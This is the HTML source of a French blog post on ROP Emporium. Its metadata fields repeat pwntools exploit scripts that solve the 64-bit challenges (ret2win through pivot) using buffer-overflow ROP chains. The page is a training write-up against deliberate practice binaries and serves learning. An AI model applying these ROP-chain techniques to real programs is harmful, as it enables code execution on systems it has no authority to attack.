@@ -1,0 +1,511 @@
+<!DOCTYPE html>
+<html lang="en"><head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1"><!-- Begin Jekyll SEO tag v2.7.1 -->
+<title>ROP Emporium | kik0uO7</title>
+<meta name="generator" content="Jekyll v4.1.1" />
+<meta property="og:title" content="ROP Emporium" />
+<meta name="author" content="kik0u7" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="Context Vous retrouverez mes scripts permettant de résoudre chacune des ROP présente dans la catégorie 64bits de ROP Emporium. Les scripts présent ici ont été testés sur la version Juillet 2020 des challenges ret2win Locate a method within the binary that you want to call and do so by overwriting a saved return address on the stack. Le binaire est disponible sur le site officiel, ici solution from pwn import * elf = ELF(&#39;./ret2win&#39;) io = elf.process() addr_ret2win = elf.sym.ret2win padding = b&#39;A&#39; * 40 payload = padding + p64(addr_ret2win) io.recvuntil(b&#39;&gt; &#39;) io.sendline(payload) log.success(io.recvall().decode()) split In this challenge the elements that allowed you to complete the ret2win challenge are still present, they’ve just been split apart. Find them and recombine them using a short ROP chain. Le binaire est disponible sur le site officiel, ici solution from pwn import * io = process(&quot;./split&quot;) addr_system = p64(0x0000000000400560) addr_bincatflag = p64(0x601060) addr_gadget_pop = p64(0x00000000004007c3) padding = b&#39;A&#39; * 40 rop = addr_gadget_pop rop += addr_bincatflag rop += addr_system payload = padding + rop io.recvuntil(b&#39;&gt; &#39;) io.sendline(payload) log.success(io.recvall().decode()) callme Reliably make consecutive calls to imported functions. Use some new techniques and learn about the Procedure Linkage Table. Le binaire est disponible sur le site officiel, ici solution from pwn import * elf = ELF(&#39;./callme&#39;) io = elf.process() addr_call1 = p64(elf.sym.callme_one) addr_call2 = p64(elf.sym.callme_two) addr_call3 = p64(elf.sym.callme_three) addr_arg1 = p64(0xdeadbeefdeadbeef) addr_arg2 = p64(0xcafebabecafebabe) addr_arg3 = p64(0xd00df00dd00df00d) # 0x000000000040093c: pop rdi; pop rsi; pop rdx; ret; addr_pop_arg_1_2_3 = p64(0x000000000040093c) padding = b&#39;A&#39;*40 rop = addr_pop_arg_1_2_3 + addr_arg1 + addr_arg2 + addr_arg3 + addr_call1 rop += addr_pop_arg_1_2_3 + addr_arg1 + addr_arg2 + addr_arg3 + addr_call2 rop += addr_pop_arg_1_2_3 + addr_arg1 + addr_arg2 + addr_arg3 + addr_call3 payload = padding + rop io.recvuntil(&quot;&gt; &quot;) io.sendline(payload) log.success(io.recvall().decode()) write4 Our first foray into proper gadget use. A useful function is still present but we’ll need to write a string into memory somehow. Le binaire est disponible sur le site officiel, ici solution from pwn import * elf = ELF(&#39;./write4&#39;) io = elf.process() ### ADDRESS WRITE ### addr_write = 0x0000000000601500 ### GADGET ### # 0x0000000000400628: mov qword ptr [r14], r15; ret; gadget_mov = p64(0x0000000000400628) # 0x0000000000400690: pop r14; pop r15; ret; gadget_pop_r14_r15 = p64(0x0000000000400690) # 0x0000000000400693: pop rdi; ret; gadget_rdi = p64(0x0000000000400693) def write_rop(string): old_size = len(string) if (old_size % 8) != 0: string = string+b&#39;\x00&#39;*(8-(old_size%8)) array_str = [ string[i*8 : (i+1)*8] for i in range(len(string)//8)] rop = b&#39;&#39; for offset, eight in enumerate(array_str): rop += gadget_pop_r14_r15 + p64(addr_write + offset * 8) + eight rop += gadget_mov return rop ####### addr_print_file = p64(elf.sym.print_file) padding = b&#39;A&#39; * 40 rop = write_rop(b&#39;/etc/fstab&#39;) rop += gadget_rdi + p64(addr_write) + addr_print_file payload = padding + rop io.recvuntil(b&#39;&gt; &#39;) io.sendline(payload) log.success(io.recvall().decode()) badchars An arbitrary write challenge with a twist; certain input characters get mangled as they make their way onto the stack. Find a way to deal with this and craft your exploit. Le binaire est disponible sur le site officiel, ici solution from pwn import * elf = ELF(&quot;./badchars&quot;, False) io = elf.process() def gadget_pop(r12, r13, r14, r15): # 0x000000000040069c: pop r12; pop r13; pop r14; pop r15; ret; gadget_pop_r12_r13_r14_r15 = p64(0x000000000040069c) return gadget_pop_r12_r13_r14_r15 + r12 + r13 + r14 + r15 ##### Écrire en mémoire ##### # 0x0000000000400634: mov qword ptr [r13], r12; ret; gadget_mov = p64(0x0000000000400634) ##### Modfier les badchars # 0x0000000000400628: xor byte ptr [r15], r14b; ret; gadget_xor = p64(0x0000000000400628) #### Appel de la fonction print_flag # 0x00000000004006a3: pop rdi; ret; gadget_pop_rdi = p64(0x00000000004006a3) #### Adresse dans .bss (aka ou je peux écrire) addr_write = 0x0000000000601042 def bad_rop(b, offset, bad): bad_rop = b&#39;&#39; xor_key = 0xde for i in range(8): addr = p64(addr_write + i + offset * 8) if b[i] in bad: bad_rop += gadget_pop(p64(b[i] ^ xor_key), addr, p64(xor_key), addr) + gadget_mov + gadget_xor else: bad_rop += gadget_pop(p64(b[i]), addr, p64(0x0), addr) + gadget_mov return bad_rop def good_rop(b, offset): return gadget_pop(b, p64(addr_write + offset * 8), p64(0), p64(0)) + gadget_mov def bad_in(b, badchars): for bad in badchars: if bad in b: return True return False def rop_chain(b): badcahars = b&#39;agx.&#39; len_b = len(b) if len_b%8 != 0: b = b + b&#39;\x00&#39;*(8-(len_b%8)) array_b = [ b[i*8:(i+1)*8] for i in range(len(b) // 8) ] rop = b&#39;&#39; for i in range(len(array_b)): if bad_in(array_b[i], badcahars): rop += bad_rop(array_b[i], i, badcahars) else: rop += good_rop(array_b[i], i) return rop if __name__ == &quot;__main__&quot;: addr_printfile = p64(elf.sym.print_file) padding = b&#39;A&#39; * 40 payload = padding + rop_chain(b&#39;flag.txt&#39;) payload += gadget_pop_rdi + p64(addr_write) + addr_printfile io.recvuntil(b&#39;&gt; &#39;) io.sendline(payload) log.success(io.recvall().decode()) fluff The concept here is identical to the write4 challenge. The only difference is we may struggle to find gadgets that will get the job done. However if we take our time to consider all our options, we’ll succeed. Le binaire est disponible sur le site officiel, ici solution from pwn import * elf = ELF(&#39;./fluff&#39;, False) io = elf.process() # 0x0000000000400639: stosb byte ptr [rdi], al; ret; gadget_stosb = p64(0x0000000000400639) # 0x00000000004006a3: pop rdi; ret; gadget_pop_rdi = p64(0x00000000004006a3) # 0x0000000000400628: xlatb; ret; gadget_xlatb = p64(0x0000000000400628) # 0x000000000040062a: pop rdx; pop rcx; add rcx, 0x3ef2; bextr rbx, rcx, rdx; ret; gadget_bextr = p64(0x000000000040062a) def search_string(string): offsets = list() chars = list() for val in string: offsets.append(next(elf.search(val.encode()))) chars.append(val) return offsets, chars if __name__ == &quot;__main__&quot;: padding = b&#39;A&#39; * 40 print_file = gadget_pop_rdi + p64(0x0000000000601450) + p64(elf.sym.print_file) fileopen = &quot;flag.txt&quot; flag_txt_off, flag_txt_chr = search_string(fileopen) rop = b&#39;&#39; rax = 0xb for i in range(len(fileopen)): if i != 0: rax = ord(flag_txt_chr[i-1]) rop += gadget_bextr + p64(0b10000000_00000000) rop += p64(flag_txt_off[i] - 0x3ef2 - rax) rop += gadget_xlatb rop += gadget_pop_rdi rop += p64(0x0000000000601450 + i) rop += gadget_stosb payload = padding payload += rop payload += print_file io.recvuntil(&quot;&gt; &quot;) io.sendline(payload) log.success(io.recvall().decode()) pivot There’s only enough space for a small ROP chain on the stack, but you’ve been given space to stash a much larger chain elsewhere. Learn how to pivot the stack onto a new location. Le binaire est disponible sur le site officiel, ici solution from pwn import * elf = ELF(&#39;./pivot&#39;, False) libpivot = ELF(&#39;./libpivot.so&#39;, False) target = elf.process() # gdb.attach(target.proc.pid, &#39;b*pwnme&#39;) ### GADGET ### # 0x0000000000400a2d: pop rsp; pop r13; pop r14; pop r15; ret; gad_pop_rsp_r13_r14_r15 = p64(0x0000000000400a2d) # 0x0000000000400a33: pop rdi; ret; gad_pop_rdi = p64(0x0000000000400a33) ### GET PIVOT ADDRESS ### target.recvuntil(&#39;pivot: &#39;) addr_pivot = int(target.recvline().strip(), 16) log.success(f&quot;Adresse du pivot: {hex(addr_pivot)}&quot;) ### ROP AFTER PIVOT ### target.recvuntil(&#39;&gt; &#39;) rop_pivot = p64(13) + p64(14) + p64(15) rop_pivot += p64(elf.symbols[&#39;foothold_function&#39;]) rop_pivot += gad_pop_rdi + p64(elf.got[&#39;foothold_function&#39;]) rop_pivot += p64(elf.symbols[&#39;puts&#39;]) rop_pivot += p64(elf.symbols[&#39;main&#39;]) target.sendline(rop_pivot) ### ROP FOR PIVOT ### target.recvuntil(&#39;&gt; &#39;) padding = b&#39;A&#39; * 40 rop_smash = padding rop_smash += gad_pop_rsp_r13_r14_r15 + p64(addr_pivot) target.sendline(rop_smash) ### GET THE LEAK target.recvuntil(&#39;libpivot\n&#39;) addr_foothold_function = u64((target.recvline().strip()+b&#39;\x00&#39;*8)[:8]) log.success(f&quot;Adresse de foothold_function dans le bin : {hex(addr_foothold_function)}&quot;) ### CALCULATE SOME OFFSETS libpivot.address = addr_foothold_function - libpivot.symbols[&#39;foothold_function&#39;] addr_ret2win = libpivot.symbols[&#39;ret2win&#39;] print(target.recvuntil(&#39;&gt; &#39;)) target.sendline(b&#39;USELESS!&#39;) target.recvuntil(&#39;&gt; &#39;) rop_ret2win = padding + p64(addr_ret2win) target.sendline(rop_ret2win) log.success(target.recvall().decode()) ret2csu We’re back in ret2win territory, but this time with no useful gadgets. How will we populate critical registers without them? Le binaire est disponible sur le site officiel, ici solution ### Nothing to see here..." />
+<meta property="og:description" content="Context Vous retrouverez mes scripts permettant de résoudre chacune des ROP présente dans la catégorie 64bits de ROP Emporium. Les scripts présent ici ont été testés sur la version Juillet 2020 des challenges ret2win Locate a method within the binary that you want to call and do so by overwriting a saved return address on the stack. Le binaire est disponible sur le site officiel, ici solution from pwn import * elf = ELF(&#39;./ret2win&#39;) io = elf.process() addr_ret2win = elf.sym.ret2win padding = b&#39;A&#39; * 40 payload = padding + p64(addr_ret2win) io.recvuntil(b&#39;&gt; &#39;) io.sendline(payload) log.success(io.recvall().decode()) split In this challenge the elements that allowed you to complete the ret2win challenge are still present, they’ve just been split apart. Find them and recombine them using a short ROP chain. Le binaire est disponible sur le site officiel, ici solution from pwn import * io = process(&quot;./split&quot;) addr_system = p64(0x0000000000400560) addr_bincatflag = p64(0x601060) addr_gadget_pop = p64(0x00000000004007c3) padding = b&#39;A&#39; * 40 rop = addr_gadget_pop rop += addr_bincatflag rop += addr_system payload = padding + rop io.recvuntil(b&#39;&gt; &#39;) io.sendline(payload) log.success(io.recvall().decode()) callme Reliably make consecutive calls to imported functions. Use some new techniques and learn about the Procedure Linkage Table. Le binaire est disponible sur le site officiel, ici solution from pwn import * elf = ELF(&#39;./callme&#39;) io = elf.process() addr_call1 = p64(elf.sym.callme_one) addr_call2 = p64(elf.sym.callme_two) addr_call3 = p64(elf.sym.callme_three) addr_arg1 = p64(0xdeadbeefdeadbeef) addr_arg2 = p64(0xcafebabecafebabe) addr_arg3 = p64(0xd00df00dd00df00d) # 0x000000000040093c: pop rdi; pop rsi; pop rdx; ret; addr_pop_arg_1_2_3 = p64(0x000000000040093c) padding = b&#39;A&#39;*40 rop = addr_pop_arg_1_2_3 + addr_arg1 + addr_arg2 + addr_arg3 + addr_call1 rop += addr_pop_arg_1_2_3 + addr_arg1 + addr_arg2 + addr_arg3 + addr_call2 rop += addr_pop_arg_1_2_3 + addr_arg1 + addr_arg2 + addr_arg3 + addr_call3 payload = padding + rop io.recvuntil(&quot;&gt; &quot;) io.sendline(payload) log.success(io.recvall().decode()) write4 Our first foray into proper gadget use. A useful function is still present but we’ll need to write a string into memory somehow. Le binaire est disponible sur le site officiel, ici solution from pwn import * elf = ELF(&#39;./write4&#39;) io = elf.process() ### ADDRESS WRITE ### addr_write = 0x0000000000601500 ### GADGET ### # 0x0000000000400628: mov qword ptr [r14], r15; ret; gadget_mov = p64(0x0000000000400628) # 0x0000000000400690: pop r14; pop r15; ret; gadget_pop_r14_r15 = p64(0x0000000000400690) # 0x0000000000400693: pop rdi; ret; gadget_rdi = p64(0x0000000000400693) def write_rop(string): old_size = len(string) if (old_size % 8) != 0: string = string+b&#39;\x00&#39;*(8-(old_size%8)) array_str = [ string[i*8 : (i+1)*8] for i in range(len(string)//8)] rop = b&#39;&#39; for offset, eight in enumerate(array_str): rop += gadget_pop_r14_r15 + p64(addr_write + offset * 8) + eight rop += gadget_mov return rop ####### addr_print_file = p64(elf.sym.print_file) padding = b&#39;A&#39; * 40 rop = write_rop(b&#39;/etc/fstab&#39;) rop += gadget_rdi + p64(addr_write) + addr_print_file payload = padding + rop io.recvuntil(b&#39;&gt; &#39;) io.sendline(payload) log.success(io.recvall().decode()) badchars An arbitrary write challenge with a twist; certain input characters get mangled as they make their way onto the stack. Find a way to deal with this and craft your exploit. Le binaire est disponible sur le site officiel, ici solution from pwn import * elf = ELF(&quot;./badchars&quot;, False) io = elf.process() def gadget_pop(r12, r13, r14, r15): # 0x000000000040069c: pop r12; pop r13; pop r14; pop r15; ret; gadget_pop_r12_r13_r14_r15 = p64(0x000000000040069c) return gadget_pop_r12_r13_r14_r15 + r12 + r13 + r14 + r15 ##### Écrire en mémoire ##### # 0x0000000000400634: mov qword ptr [r13], r12; ret; gadget_mov = p64(0x0000000000400634) ##### Modfier les badchars # 0x0000000000400628: xor byte ptr [r15], r14b; ret; gadget_xor = p64(0x0000000000400628) #### Appel de la fonction print_flag # 0x00000000004006a3: pop rdi; ret; gadget_pop_rdi = p64(0x00000000004006a3) #### Adresse dans .bss (aka ou je peux écrire) addr_write = 0x0000000000601042 def bad_rop(b, offset, bad): bad_rop = b&#39;&#39; xor_key = 0xde for i in range(8): addr = p64(addr_write + i + offset * 8) if b[i] in bad: bad_rop += gadget_pop(p64(b[i] ^ xor_key), addr, p64(xor_key), addr) + gadget_mov + gadget_xor else: bad_rop += gadget_pop(p64(b[i]), addr, p64(0x0), addr) + gadget_mov return bad_rop def good_rop(b, offset): return gadget_pop(b, p64(addr_write + offset * 8), p64(0), p64(0)) + gadget_mov def bad_in(b, badchars): for bad in badchars: if bad in b: return True return False def rop_chain(b): badcahars = b&#39;agx.&#39; len_b = len(b) if len_b%8 != 0: b = b + b&#39;\x00&#39;*(8-(len_b%8)) array_b = [ b[i*8:(i+1)*8] for i in range(len(b) // 8) ] rop = b&#39;&#39; for i in range(len(array_b)): if bad_in(array_b[i], badcahars): rop += bad_rop(array_b[i], i, badcahars) else: rop += good_rop(array_b[i], i) return rop if __name__ == &quot;__main__&quot;: addr_printfile = p64(elf.sym.print_file) padding = b&#39;A&#39; * 40 payload = padding + rop_chain(b&#39;flag.txt&#39;) payload += gadget_pop_rdi + p64(addr_write) + addr_printfile io.recvuntil(b&#39;&gt; &#39;) io.sendline(payload) log.success(io.recvall().decode()) fluff The concept here is identical to the write4 challenge. The only difference is we may struggle to find gadgets that will get the job done. However if we take our time to consider all our options, we’ll succeed. Le binaire est disponible sur le site officiel, ici solution from pwn import * elf = ELF(&#39;./fluff&#39;, False) io = elf.process() # 0x0000000000400639: stosb byte ptr [rdi], al; ret; gadget_stosb = p64(0x0000000000400639) # 0x00000000004006a3: pop rdi; ret; gadget_pop_rdi = p64(0x00000000004006a3) # 0x0000000000400628: xlatb; ret; gadget_xlatb = p64(0x0000000000400628) # 0x000000000040062a: pop rdx; pop rcx; add rcx, 0x3ef2; bextr rbx, rcx, rdx; ret; gadget_bextr = p64(0x000000000040062a) def search_string(string): offsets = list() chars = list() for val in string: offsets.append(next(elf.search(val.encode()))) chars.append(val) return offsets, chars if __name__ == &quot;__main__&quot;: padding = b&#39;A&#39; * 40 print_file = gadget_pop_rdi + p64(0x0000000000601450) + p64(elf.sym.print_file) fileopen = &quot;flag.txt&quot; flag_txt_off, flag_txt_chr = search_string(fileopen) rop = b&#39;&#39; rax = 0xb for i in range(len(fileopen)): if i != 0: rax = ord(flag_txt_chr[i-1]) rop += gadget_bextr + p64(0b10000000_00000000) rop += p64(flag_txt_off[i] - 0x3ef2 - rax) rop += gadget_xlatb rop += gadget_pop_rdi rop += p64(0x0000000000601450 + i) rop += gadget_stosb payload = padding payload += rop payload += print_file io.recvuntil(&quot;&gt; &quot;) io.sendline(payload) log.success(io.recvall().decode()) pivot There’s only enough space for a small ROP chain on the stack, but you’ve been given space to stash a much larger chain elsewhere. Learn how to pivot the stack onto a new location. Le binaire est disponible sur le site officiel, ici solution from pwn import * elf = ELF(&#39;./pivot&#39;, False) libpivot = ELF(&#39;./libpivot.so&#39;, False) target = elf.process() # gdb.attach(target.proc.pid, &#39;b*pwnme&#39;) ### GADGET ### # 0x0000000000400a2d: pop rsp; pop r13; pop r14; pop r15; ret; gad_pop_rsp_r13_r14_r15 = p64(0x0000000000400a2d) # 0x0000000000400a33: pop rdi; ret; gad_pop_rdi = p64(0x0000000000400a33) ### GET PIVOT ADDRESS ### target.recvuntil(&#39;pivot: &#39;) addr_pivot = int(target.recvline().strip(), 16) log.success(f&quot;Adresse du pivot: {hex(addr_pivot)}&quot;) ### ROP AFTER PIVOT ### target.recvuntil(&#39;&gt; &#39;) rop_pivot = p64(13) + p64(14) + p64(15) rop_pivot += p64(elf.symbols[&#39;foothold_function&#39;]) rop_pivot += gad_pop_rdi + p64(elf.got[&#39;foothold_function&#39;]) rop_pivot += p64(elf.symbols[&#39;puts&#39;]) rop_pivot += p64(elf.symbols[&#39;main&#39;]) target.sendline(rop_pivot) ### ROP FOR PIVOT ### target.recvuntil(&#39;&gt; &#39;) padding = b&#39;A&#39; * 40 rop_smash = padding rop_smash += gad_pop_rsp_r13_r14_r15 + p64(addr_pivot) target.sendline(rop_smash) ### GET THE LEAK target.recvuntil(&#39;libpivot\n&#39;) addr_foothold_function = u64((target.recvline().strip()+b&#39;\x00&#39;*8)[:8]) log.success(f&quot;Adresse de foothold_function dans le bin : {hex(addr_foothold_function)}&quot;) ### CALCULATE SOME OFFSETS libpivot.address = addr_foothold_function - libpivot.symbols[&#39;foothold_function&#39;] addr_ret2win = libpivot.symbols[&#39;ret2win&#39;] print(target.recvuntil(&#39;&gt; &#39;)) target.sendline(b&#39;USELESS!&#39;) target.recvuntil(&#39;&gt; &#39;) rop_ret2win = padding + p64(addr_ret2win) target.sendline(rop_ret2win) log.success(target.recvall().decode()) ret2csu We’re back in ret2win territory, but this time with no useful gadgets. How will we populate critical registers without them? Le binaire est disponible sur le site officiel, ici solution ### Nothing to see here..." />
+<link rel="canonical" href="/ropemporium/" />
+<meta property="og:url" content="/ropemporium/" />
+<meta property="og:site_name" content="kik0uO7" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2020-10-31T16:55:43+01:00" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="ROP Emporium" />
+<script type="application/ld+json">
+{"datePublished":"2020-10-31T16:55:43+01:00","description":"Context Vous retrouverez mes scripts permettant de résoudre chacune des ROP présente dans la catégorie 64bits de ROP Emporium. Les scripts présent ici ont été testés sur la version Juillet 2020 des challenges ret2win Locate a method within the binary that you want to call and do so by overwriting a saved return address on the stack. Le binaire est disponible sur le site officiel, ici solution from pwn import * elf = ELF(&#39;./ret2win&#39;) io = elf.process() addr_ret2win = elf.sym.ret2win padding = b&#39;A&#39; * 40 payload = padding + p64(addr_ret2win) io.recvuntil(b&#39;&gt; &#39;) io.sendline(payload) log.success(io.recvall().decode()) split In this challenge the elements that allowed you to complete the ret2win challenge are still present, they’ve just been split apart. Find them and recombine them using a short ROP chain. Le binaire est disponible sur le site officiel, ici solution from pwn import * io = process(&quot;./split&quot;) addr_system = p64(0x0000000000400560) addr_bincatflag = p64(0x601060) addr_gadget_pop = p64(0x00000000004007c3) padding = b&#39;A&#39; * 40 rop = addr_gadget_pop rop += addr_bincatflag rop += addr_system payload = padding + rop io.recvuntil(b&#39;&gt; &#39;) io.sendline(payload) log.success(io.recvall().decode()) callme Reliably make consecutive calls to imported functions. Use some new techniques and learn about the Procedure Linkage Table. Le binaire est disponible sur le site officiel, ici solution from pwn import * elf = ELF(&#39;./callme&#39;) io = elf.process() addr_call1 = p64(elf.sym.callme_one) addr_call2 = p64(elf.sym.callme_two) addr_call3 = p64(elf.sym.callme_three) addr_arg1 = p64(0xdeadbeefdeadbeef) addr_arg2 = p64(0xcafebabecafebabe) addr_arg3 = p64(0xd00df00dd00df00d) # 0x000000000040093c: pop rdi; pop rsi; pop rdx; ret; addr_pop_arg_1_2_3 = p64(0x000000000040093c) padding = b&#39;A&#39;*40 rop = addr_pop_arg_1_2_3 + addr_arg1 + addr_arg2 + addr_arg3 + addr_call1 rop += addr_pop_arg_1_2_3 + addr_arg1 + addr_arg2 + addr_arg3 + addr_call2 rop += addr_pop_arg_1_2_3 + addr_arg1 + addr_arg2 + addr_arg3 + addr_call3 payload = padding + rop io.recvuntil(&quot;&gt; &quot;) io.sendline(payload) log.success(io.recvall().decode()) write4 Our first foray into proper gadget use. A useful function is still present but we’ll need to write a string into memory somehow. Le binaire est disponible sur le site officiel, ici solution from pwn import * elf = ELF(&#39;./write4&#39;) io = elf.process() ### ADDRESS WRITE ### addr_write = 0x0000000000601500 ### GADGET ### # 0x0000000000400628: mov qword ptr [r14], r15; ret; gadget_mov = p64(0x0000000000400628) # 0x0000000000400690: pop r14; pop r15; ret; gadget_pop_r14_r15 = p64(0x0000000000400690) # 0x0000000000400693: pop rdi; ret; gadget_rdi = p64(0x0000000000400693) def write_rop(string): old_size = len(string) if (old_size % 8) != 0: string = string+b&#39;\\x00&#39;*(8-(old_size%8)) array_str = [ string[i*8 : (i+1)*8] for i in range(len(string)//8)] rop = b&#39;&#39; for offset, eight in enumerate(array_str): rop += gadget_pop_r14_r15 + p64(addr_write + offset * 8) + eight rop += gadget_mov return rop ####### addr_print_file = p64(elf.sym.print_file) padding = b&#39;A&#39; * 40 rop = write_rop(b&#39;/etc/fstab&#39;) rop += gadget_rdi + p64(addr_write) + addr_print_file payload = padding + rop io.recvuntil(b&#39;&gt; &#39;) io.sendline(payload) log.success(io.recvall().decode()) badchars An arbitrary write challenge with a twist; certain input characters get mangled as they make their way onto the stack. Find a way to deal with this and craft your exploit. Le binaire est disponible sur le site officiel, ici solution from pwn import * elf = ELF(&quot;./badchars&quot;, False) io = elf.process() def gadget_pop(r12, r13, r14, r15): # 0x000000000040069c: pop r12; pop r13; pop r14; pop r15; ret; gadget_pop_r12_r13_r14_r15 = p64(0x000000000040069c) return gadget_pop_r12_r13_r14_r15 + r12 + r13 + r14 + r15 ##### Écrire en mémoire ##### # 0x0000000000400634: mov qword ptr [r13], r12; ret; gadget_mov = p64(0x0000000000400634) ##### Modfier les badchars # 0x0000000000400628: xor byte ptr [r15], r14b; ret; gadget_xor = p64(0x0000000000400628) #### Appel de la fonction print_flag # 0x00000000004006a3: pop rdi; ret; gadget_pop_rdi = p64(0x00000000004006a3) #### Adresse dans .bss (aka ou je peux écrire) addr_write = 0x0000000000601042 def bad_rop(b, offset, bad): bad_rop = b&#39;&#39; xor_key = 0xde for i in range(8): addr = p64(addr_write + i + offset * 8) if b[i] in bad: bad_rop += gadget_pop(p64(b[i] ^ xor_key), addr, p64(xor_key), addr) + gadget_mov + gadget_xor else: bad_rop += gadget_pop(p64(b[i]), addr, p64(0x0), addr) + gadget_mov return bad_rop def good_rop(b, offset): return gadget_pop(b, p64(addr_write + offset * 8), p64(0), p64(0)) + gadget_mov def bad_in(b, badchars): for bad in badchars: if bad in b: return True return False def rop_chain(b): badcahars = b&#39;agx.&#39; len_b = len(b) if len_b%8 != 0: b = b + b&#39;\\x00&#39;*(8-(len_b%8)) array_b = [ b[i*8:(i+1)*8] for i in range(len(b) // 8) ] rop = b&#39;&#39; for i in range(len(array_b)): if bad_in(array_b[i], badcahars): rop += bad_rop(array_b[i], i, badcahars) else: rop += good_rop(array_b[i], i) return rop if __name__ == &quot;__main__&quot;: addr_printfile = p64(elf.sym.print_file) padding = b&#39;A&#39; * 40 payload = padding + rop_chain(b&#39;flag.txt&#39;) payload += gadget_pop_rdi + p64(addr_write) + addr_printfile io.recvuntil(b&#39;&gt; &#39;) io.sendline(payload) log.success(io.recvall().decode()) fluff The concept here is identical to the write4 challenge. The only difference is we may struggle to find gadgets that will get the job done. However if we take our time to consider all our options, we’ll succeed. Le binaire est disponible sur le site officiel, ici solution from pwn import * elf = ELF(&#39;./fluff&#39;, False) io = elf.process() # 0x0000000000400639: stosb byte ptr [rdi], al; ret; gadget_stosb = p64(0x0000000000400639) # 0x00000000004006a3: pop rdi; ret; gadget_pop_rdi = p64(0x00000000004006a3) # 0x0000000000400628: xlatb; ret; gadget_xlatb = p64(0x0000000000400628) # 0x000000000040062a: pop rdx; pop rcx; add rcx, 0x3ef2; bextr rbx, rcx, rdx; ret; gadget_bextr = p64(0x000000000040062a) def search_string(string): offsets = list() chars = list() for val in string: offsets.append(next(elf.search(val.encode()))) chars.append(val) return offsets, chars if __name__ == &quot;__main__&quot;: padding = b&#39;A&#39; * 40 print_file = gadget_pop_rdi + p64(0x0000000000601450) + p64(elf.sym.print_file) fileopen = &quot;flag.txt&quot; flag_txt_off, flag_txt_chr = search_string(fileopen) rop = b&#39;&#39; rax = 0xb for i in range(len(fileopen)): if i != 0: rax = ord(flag_txt_chr[i-1]) rop += gadget_bextr + p64(0b10000000_00000000) rop += p64(flag_txt_off[i] - 0x3ef2 - rax) rop += gadget_xlatb rop += gadget_pop_rdi rop += p64(0x0000000000601450 + i) rop += gadget_stosb payload = padding payload += rop payload += print_file io.recvuntil(&quot;&gt; &quot;) io.sendline(payload) log.success(io.recvall().decode()) pivot There’s only enough space for a small ROP chain on the stack, but you’ve been given space to stash a much larger chain elsewhere. Learn how to pivot the stack onto a new location. Le binaire est disponible sur le site officiel, ici solution from pwn import * elf = ELF(&#39;./pivot&#39;, False) libpivot = ELF(&#39;./libpivot.so&#39;, False) target = elf.process() # gdb.attach(target.proc.pid, &#39;b*pwnme&#39;) ### GADGET ### # 0x0000000000400a2d: pop rsp; pop r13; pop r14; pop r15; ret; gad_pop_rsp_r13_r14_r15 = p64(0x0000000000400a2d) # 0x0000000000400a33: pop rdi; ret; gad_pop_rdi = p64(0x0000000000400a33) ### GET PIVOT ADDRESS ### target.recvuntil(&#39;pivot: &#39;) addr_pivot = int(target.recvline().strip(), 16) log.success(f&quot;Adresse du pivot: {hex(addr_pivot)}&quot;) ### ROP AFTER PIVOT ### target.recvuntil(&#39;&gt; &#39;) rop_pivot = p64(13) + p64(14) + p64(15) rop_pivot += p64(elf.symbols[&#39;foothold_function&#39;]) rop_pivot += gad_pop_rdi + p64(elf.got[&#39;foothold_function&#39;]) rop_pivot += p64(elf.symbols[&#39;puts&#39;]) rop_pivot += p64(elf.symbols[&#39;main&#39;]) target.sendline(rop_pivot) ### ROP FOR PIVOT ### target.recvuntil(&#39;&gt; &#39;) padding = b&#39;A&#39; * 40 rop_smash = padding rop_smash += gad_pop_rsp_r13_r14_r15 + p64(addr_pivot) target.sendline(rop_smash) ### GET THE LEAK target.recvuntil(&#39;libpivot\\n&#39;) addr_foothold_function = u64((target.recvline().strip()+b&#39;\\x00&#39;*8)[:8]) log.success(f&quot;Adresse de foothold_function dans le bin : {hex(addr_foothold_function)}&quot;) ### CALCULATE SOME OFFSETS libpivot.address = addr_foothold_function - libpivot.symbols[&#39;foothold_function&#39;] addr_ret2win = libpivot.symbols[&#39;ret2win&#39;] print(target.recvuntil(&#39;&gt; &#39;)) target.sendline(b&#39;USELESS!&#39;) target.recvuntil(&#39;&gt; &#39;) rop_ret2win = padding + p64(addr_ret2win) target.sendline(rop_ret2win) log.success(target.recvall().decode()) ret2csu We’re back in ret2win territory, but this time with no useful gadgets. How will we populate critical registers without them? Le binaire est disponible sur le site officiel, ici solution ### Nothing to see here...","mainEntityOfPage":{"@type":"WebPage","@id":"/ropemporium/"},"url":"/ropemporium/","@type":"BlogPosting","author":{"@type":"Person","name":"kik0u7"},"headline":"ROP Emporium","dateModified":"2020-10-31T16:55:43+01:00","@context":"https://schema.org"}</script>
+<!-- End Jekyll SEO tag -->
+<link rel="stylesheet" href="/assets/main.css"><link type="application/atom+xml" rel="alternate" href="/feed.xml" title="kik0uO7" /></head>
+<body><header class="site-header" role="banner">
+
+  <div class="wrapper"><a class="site-title" rel="author" href="/">kik0uO7</a><nav class="site-nav">
+        <input type="checkbox" id="nav-trigger" class="nav-trigger" />
+        <label for="nav-trigger">
+          <span class="menu-icon">
+            <svg viewBox="0 0 18 15" width="18px" height="15px">
+              <path d="M18,1.484c0,0.82-0.665,1.484-1.484,1.484H1.484C0.665,2.969,0,2.304,0,1.484l0,0C0,0.665,0.665,0,1.484,0 h15.032C17.335,0,18,0.665,18,1.484L18,1.484z M18,7.516C18,8.335,17.335,9,16.516,9H1.484C0.665,9,0,8.335,0,7.516l0,0 c0-0.82,0.665-1.484,1.484-1.484h15.032C17.335,6.031,18,6.696,18,7.516L18,7.516z M18,13.516C18,14.335,17.335,15,16.516,15H1.484 C0.665,15,0,14.335,0,13.516l0,0c0-0.82,0.665-1.483,1.484-1.483h15.032C17.335,12.031,18,12.695,18,13.516L18,13.516z"/>
+            </svg>
+          </span>
+        </label>
+
+        <div class="trigger"><a class="page-link" href="/about/">About</a><a class="page-link" href="/posts/">Related posts</a><a class="page-link" href="/tags/">Tags</a></div>
+      </nav></div>
+</header>
+<main class="page-content" aria-label="Content">
+      <div class="wrapper">
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+
+  <header class="post-header">
+    <h1 class="post-title p-name" itemprop="name headline">ROP Emporium</h1>
+    <p class="post-meta"><time class="dt-published" datetime="2020-10-31T16:55:43+01:00" itemprop="datePublished">
+        Oct 31, 2020
+      </time>• 
+          <span itemprop="author" itemscope itemtype="http://schema.org/Person">
